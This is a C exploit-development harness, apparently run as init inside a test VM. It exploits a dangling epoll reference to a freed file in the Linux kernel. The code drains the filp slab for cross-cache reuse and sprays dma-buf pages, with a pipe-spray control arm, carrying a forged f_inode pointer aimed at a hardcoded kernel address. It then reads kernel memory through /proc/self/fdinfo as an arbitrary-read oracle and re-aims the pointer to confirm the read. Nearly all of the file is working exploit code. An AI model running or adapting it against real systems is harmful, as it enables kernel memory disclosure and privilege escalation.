// test_hyp011_aar.c — HYP-011: dma-buf Reclaim Vehicle & AAR Verification
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/reboot.h>
#include <sys/ioctl.h>
#include <linux/dma-heap.h>
#include <errno.h>

#define OBJS_PER_SLAB 16
#define BATCH_A_SIZE 32
#define BATCH_B_SIZE 32
#define BG_PRESSURE_FILES 4000

#define PAGES_PER_ROUND 8192
#define NUM_SPRAY_ROUNDS 5
#define MAX_TOTAL_PAGES (NUM_SPRAY_ROUNDS * PAGES_PER_ROUND) // 40,960 pages (160 MB)

static void print_str(const char *s) {
    write(STDOUT_FILENO, s, strlen(s));
}

static long read_filp_slabs_count(void) {
    int fd = open("/sys/kernel/slab/filp/slabs", O_RDONLY);
    if (fd < 0) return -1;
    char buf[64] = {0};
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = '\0';
    return strtol(buf, NULL, 10);
}

// Markers for GDB automation
void marker_setup_done(int epA_fd, int inner_fd) {
    char buf[128];
    snprintf(buf, sizeof(buf), "[HYP-011] MARKER: setup_done epA=%d inner=%d\n", epA_fd, inner_fd);
    print_str(buf);
}

void marker_close_started(void) {
    print_str("[HYP-011] MARKER: close_started\n");
}

void marker_close_done(void) {
    print_str("[HYP-011] MARKER: close_done\n");
}

void marker_sandwich_freed(long slabs_before, long slabs_after) {
    char buf[128];
    snprintf(buf, sizeof(buf), "[HYP-011] MARKER: sandwich_freed slabs_before=%ld slabs_after=%ld\n", slabs_before, slabs_after);
    print_str(buf);
}

void marker_spray_round_done(int round, int total_pages) {
    char buf[128];
    snprintf(buf, sizeof(buf), "[HYP-011] MARKER: spray_round_done round=%d total_pages=%d total_mb=%d\n",
             round, total_pages, total_pages * 4 / 1024);
    print_str(buf);
}

void marker_experiment_complete(int status, unsigned long ino1, unsigned long ino2) {
    char buf[160];
    snprintf(buf, sizeof(buf), "[HYP-011] MARKER: experiment_complete status=%d ino1=0x%lx ino2=0x%lx\n", status, ino1, ino2);
    print_str(buf);
}

static int read_fdinfo_ino(int epfd, char *out_buf, size_t max_len, unsigned long *out_ino) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epfd);
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        snprintf(out_buf, max_len, "ERR_OPEN_%d", errno);
        return -1;
    }
    int n = read(fd, out_buf, max_len - 1);
    close(fd);
    if (n <= 0) {
        snprintf(out_buf, max_len, "ERR_READ_%d", errno);
        return -1;
    }
    out_buf[n] = '\0';

    char *tfd_str = strstr(out_buf, "tfd:");
    if (tfd_str) {
        char *ino_str = strstr(tfd_str, "ino:");
        if (ino_str) {
            *out_ino = strtoul(ino_str + 4, NULL, 16);
            return 0;
        }
    }
    return -2;
}

static int setup_dmabuf_devnode(void) {
    mkdir("/dev/dma_heap", 0755);
    int fd = open("/sys/class/dma_heap/system/dev", O_RDONLY);
    if (fd < 0) {
        fd = open("/sys/devices/virtual/dma_heap/system/dev", O_RDONLY);
    }
    if (fd >= 0) {
        char buf[32] = {0};
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            int maj = 0, min = 0;
            if (sscanf(buf, "%d:%d", &maj, &min) == 2) {
                unlink("/dev/dma_heap/system");
                if (mknod("/dev/dma_heap/system", S_IFCHR | 0666, makedev(maj, min)) == 0) {
                    return 0;
                }
            }
        }
    }
    return -1;
}

static int alloc_dmabuf_page(int heap_fd, int *out_fd, void **out_map) {
    struct dma_heap_allocation_data data = {
        .len = 4096,
        .fd = 0,
        .fd_flags = O_RDWR | O_CLOEXEC,
        .heap_flags = 0,
    };
    int ret = ioctl(heap_fd, DMA_HEAP_IOCTL_ALLOC, &data);
    if (ret < 0) return -1;
    *out_fd = data.fd;
    *out_map = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, data.fd, 0);
    if (*out_map == MAP_FAILED) {
        close(data.fd);
        return -1;
    }
    return 0;
}

int main(int argc, char **argv) {
    bool pipe_control = (argc > 1 && strcmp(argv[1], "pipe") == 0);

    print_str("========================================================\n");
    if (pipe_control) {
        print_str("=== HYP-011 Control Arm: Pipe Spray (H-c Prediction) ===\n");
    } else {
        print_str("=== HYP-011 Part 1: dma-buf Reclaim Vehicle & AAR ===\n");
    }
    print_str("========================================================\n");

    struct rlimit rlim = { .rlim_cur = 65536, .rlim_max = 65536 };
    setrlimit(RLIMIT_NOFILE, &rlim);

    mkdir("/proc", 0755);
    mount("proc", "/proc", "proc", 0, NULL);
    mkdir("/sys", 0755);
    mount("sysfs", "/sys", "sysfs", 0, NULL);
    mkdir("/dev", 0755);
    mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);
    mkdir("/dev/dma_heap", 0755);
    mknod("/dev/null", S_IFCHR | 0666, makedev(1, 3));

    char buf[256];

    // Read filp slab geometry from sysfs
    long base_slabs = read_filp_slabs_count();
    snprintf(buf, sizeof(buf), "[*] Initial /sys/kernel/slab/filp/slabs = %ld\n", base_slabs);
    print_str(buf);

    // 1. Allocate background pressure files (in main process)
    print_str("[*] Allocating background pressure files (4,000 eventfds)...\n");
    int bg_fds[BG_PRESSURE_FILES];
    for (int i = 0; i < BG_PRESSURE_FILES; i++) {
        bg_fds[i] = eventfd(0, 0);
    }
    long peak_slabs = read_filp_slabs_count();
    snprintf(buf, sizeof(buf), "[*] Peak /sys/kernel/slab/filp/slabs after pressure = %ld\n", peak_slabs);
    print_str(buf);

    // 2. Create epA
    int epA = epoll_create1(0);
    if (epA < 0) {
        perror("[!] epoll_create1 epA failed");
        exit(1);
    }

    // 3. Allocate Tracked Batch A (~2x objs_per_slab files)
    int batch_a_fds[BATCH_A_SIZE];
    for (int i = 0; i < BATCH_A_SIZE; i++) {
        batch_a_fds[i] = open("/dev/null", O_RDONLY);
    }

    // 4. Allocate Victim Inner Epoll
    int inner = epoll_create1(0);
    if (inner < 0) {
        perror("[!] epoll_create1 inner failed");
        exit(1);
    }

    // 5. Allocate Tracked Batch B (~2x objs_per_slab files)
    int batch_b_fds[BATCH_B_SIZE];
    for (int i = 0; i < BATCH_B_SIZE; i++) {
        batch_b_fds[i] = open("/dev/null", O_RDONLY);
    }

    struct stat st;
    fstat(inner, &st);
    snprintf(buf, sizeof(buf), "[*] Sandwiched inner fd=%d (orig inode=0x%lx) between Batch A (%d fds) and Batch B (%d fds)\n",
             inner, (unsigned long)st.st_ino, BATCH_A_SIZE, BATCH_B_SIZE);
    print_str(buf);

    // Watch inner in epA
    struct epoll_event evA = { .events = EPOLLIN | EPOLLOUT, .data.fd = inner };
    if (epoll_ctl(epA, EPOLL_CTL_ADD, inner, &evA) < 0) {
        perror("[!] epoll_ctl ADD epA failed");
        exit(1);
    }

    marker_setup_done(epA, inner);

    // 6. Close inner fd (Thread B close path with fast-path bypass simulation)
    marker_close_started();
    close(inner);
    marker_close_done();

    // 7. Free Batch A + Batch B (emptying the victim's slab page) + background pressure
    print_str("[*] Freeing Batch A and Batch B enclosing files on victim's slab...\n");
    for (int i = 0; i < BATCH_A_SIZE; i++) {
        if (batch_a_fds[i] >= 0) close(batch_a_fds[i]);
    }
    for (int i = 0; i < BATCH_B_SIZE; i++) {
        if (batch_b_fds[i] >= 0) close(batch_b_fds[i]);
    }
    print_str("[*] Freeing background pressure files...\n");
    for (int i = 0; i < BG_PRESSURE_FILES; i++) {
        if (bg_fds[i] >= 0) close(bg_fds[i]);
    }

    print_str("[*] Waiting 2.0s for RCU grace period and SLUB slab release...\n");
    sleep(2);

    long post_drain_slabs = read_filp_slabs_count();
    snprintf(buf, sizeof(buf), "[*] Post-drain /sys/kernel/slab/filp/slabs = %ld (drop: %ld -> %ld, delta=%ld)\n",
             post_drain_slabs, peak_slabs, post_drain_slabs, peak_slabs - post_drain_slabs);
    print_str(buf);

    marker_sandwich_freed(peak_slabs, post_drain_slabs);

    if (post_drain_slabs >= peak_slabs && peak_slabs > 10) {
        print_str("[-] STOP: /sys/kernel/slab/filp/slabs did not decrease! Slabs were not drained.\n");
        marker_experiment_complete(0, 0, 0);
        reboot(RB_POWER_OFF);
        return 1;
    }
    print_str("[+] Cross-cache signal CONFIRMED: filp slab count dropped significantly!\n");

    uint64_t fake_inode_addr = 0xffffffc00973e218ULL; // &init_task.comm - offsetof(i_ino) (0x40)
    int hit = 0;
    unsigned long read_ino_round = 0;
    char fdinfo_buf[512] = {0};

    if (pipe_control) {
        // Control arm: Pipe spray (order-0 pages with GFP_HIGHUSER)
        print_str("[*] Running Pipe Spray Control Arm (5 rounds x 8,192 pages)...\n");
        int pipe_fds[MAX_TOTAL_PAGES][2];
        char pipe_page_buf[4096];
        memset(pipe_page_buf, 0, sizeof(pipe_page_buf));
        for (size_t off = 0; off < 4096; off += 256) {
            *(uint64_t *)(pipe_page_buf + off + 32) = fake_inode_addr;
        }

        int total_pipe_pages = 0;
        for (int round = 1; round <= NUM_SPRAY_ROUNDS; round++) {
            snprintf(buf, sizeof(buf), "[*] Pipe Spray Round %d: Allocating %d pages...\n", round, PAGES_PER_ROUND);
            print_str(buf);

            for (int p = 0; p < PAGES_PER_ROUND; p++) {
                int idx = (round - 1) * PAGES_PER_ROUND + p;
                if (pipe(pipe_fds[idx]) == 0) {
                    write(pipe_fds[idx][1], pipe_page_buf, 4096);
                    total_pipe_pages++;
                }
            }

            marker_spray_round_done(round, total_pipe_pages);

            memset(fdinfo_buf, 0, sizeof(fdinfo_buf));
            read_ino_round = 0;
            int res = read_fdinfo_ino(epA, fdinfo_buf, sizeof(fdinfo_buf), &read_ino_round);
            snprintf(buf, sizeof(buf), "[*] Round %d Pipe Oracle Read (res=%d, item ino=0x%lx):\n%s\n",
                     round, res, read_ino_round, fdinfo_buf);
            print_str(buf);

            if (read_ino_round == 0x0072657070617773ULL || strstr(fdinfo_buf, "72657070617773")) {
                print_str("[!] UNEXPECTED HIT in Pipe Control Arm!\n");
                hit = 1;
                break;
            }
        }
        marker_experiment_complete(hit ? 1 : 2, read_ino_round, 0);
    } else {
        // Main Arm: dma-buf spray
        setup_dmabuf_devnode();
        int heap_fd = open("/dev/dma_heap/system", O_RDWR);
        if (heap_fd < 0) {
            snprintf(buf, sizeof(buf), "[!] Failed to open /dev/dma_heap/system: %s\n", strerror(errno));
            print_str(buf);
            marker_experiment_complete(-1, 0, 0);
            reboot(RB_POWER_OFF);
            return 1;
        }
        print_str("[+] Successfully opened /dev/dma_heap/system\n");

        int dmabuf_fds[MAX_TOTAL_PAGES];
        void *dmabuf_maps[MAX_TOTAL_PAGES];
        int total_dmabuf_pages = 0;

        for (int round = 1; round <= NUM_SPRAY_ROUNDS; round++) {
            snprintf(buf, sizeof(buf), "[*] dma-buf Spray Round %d: Allocating %d pages (32MB)...\n", round, PAGES_PER_ROUND);
            print_str(buf);

            for (int p = 0; p < PAGES_PER_ROUND; p++) {
                int idx = (round - 1) * PAGES_PER_ROUND + p;
                if (alloc_dmabuf_page(heap_fd, &dmabuf_fds[idx], &dmabuf_maps[idx]) == 0) {
                    uint8_t *page_ptr = (uint8_t *)dmabuf_maps[idx];
                    for (size_t off = 0; off < 4096; off += 256) {
                        uint8_t *slot_ptr = page_ptr + off;
                        // f_inode (offset 32 = 0x20)
                        *(uint64_t *)(slot_ptr + 32) = fake_inode_addr;
                        // f_pos (offset 104 = 0x68)
                        *(uint64_t *)(slot_ptr + 104) = 0;
                    }
                    total_dmabuf_pages++;
                }
            }

            marker_spray_round_done(round, total_dmabuf_pages);

            memset(fdinfo_buf, 0, sizeof(fdinfo_buf));
            read_ino_round = 0;
            int res = read_fdinfo_ino(epA, fdinfo_buf, sizeof(fdinfo_buf), &read_ino_round);
            snprintf(buf, sizeof(buf), "[*] Round %d dma-buf Oracle Read (res=%d, item ino=0x%lx):\n%s\n",
                     round, res, read_ino_round, fdinfo_buf);
            print_str(buf);

            if (read_ino_round == 0x0072657070617773ULL || strstr(fdinfo_buf, "72657070617773")) {
                print_str("[+] ========================================================\n");
                print_str("[+] HIT! AAR MATCH: item ino matched 'swapper' (0x0072657070617773)\n");
                print_str("[+] ========================================================\n");
                hit = 1;
                break;
            }
        }

        unsigned long ino1 = read_ino_round;
        unsigned long ino2 = 0;

        if (hit) {
            // Live Re-Aim Proof (guysrd proof): Re-aim f_inode in userspace dma-buf pages to init_task.comm + 8
            uint64_t reaim_inode_addr = fake_inode_addr + 8; // 0xffffffc00973e220
            print_str("[*] Performing live re-aim: modifying f_inode in userspace dma-buf pages to (comm + 8)...\n");
            for (int i = 0; i < total_dmabuf_pages; i++) {
                if (dmabuf_maps[i] && dmabuf_maps[i] != MAP_FAILED) {
                    uint8_t *page_ptr = (uint8_t *)dmabuf_maps[i];
                    for (size_t off = 0; off < 4096; off += 256) {
                        uint8_t *slot_ptr = page_ptr + off;
                        *(uint64_t *)(slot_ptr + 32) = reaim_inode_addr;
                    }
                }
            }

            // Re-read oracle
            char reaim_buf[512] = {0};
            int res2 = read_fdinfo_ino(epA, reaim_buf, sizeof(reaim_buf), &ino2);
            snprintf(buf, sizeof(buf), "[+] LIVE RE-AIM READ VERBATIM (res=%d, item ino2=0x%lx):\n%s\n",
                     res2, ino2, reaim_buf);
            print_str(buf);

            print_str("[+] ========================================================\n");
            snprintf(buf, sizeof(buf), "[+] VER-059 VERIFIED: First read (comm)=0x%lx, Second read (comm+8)=0x%lx\n", ino1, ino2);
            print_str(buf);
            print_str("[+] ========================================================\n");
            marker_experiment_complete(1, ino1, ino2);
        } else {
            print_str("[*] PARTIAL: Read executed without hit or kernel crash.\n");
            marker_experiment_complete(2, ino1, 0);
        }
    }

    print_str("[*] Test finished. Powering off safely.\n");
    reboot(RB_POWER_OFF);
    return 0;
}
